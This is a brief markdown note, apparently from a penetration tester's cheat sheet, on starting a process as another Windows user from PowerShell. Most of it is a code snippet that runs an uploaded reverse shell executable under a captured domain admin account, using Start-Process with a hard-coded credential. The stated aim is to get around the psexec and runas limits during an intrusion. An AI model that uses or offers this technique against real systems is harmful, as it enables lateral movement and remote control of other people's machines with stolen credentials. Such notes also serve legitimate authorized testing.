## Powershell - Start process as another user without GUI interactions

I have not been able to use "runas" command, as it requires some extra input (GUI-connected?)
As certain users cannot use psexec (requires local admin access), it's simpler to upload a
reverse shell and use "start-process" with the other user's credentials.

```powershell
$program = "C:\Share\rev_shell.exe"
$usr_plain = "domain1\adm_user"
$pwd_plain = "P@ssword"
$pwd_obj = ConvertTo-SecureString $pwd_plain -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential($usr_plain, $pwd_obj)
Start-Process $program -Credential $creds
```
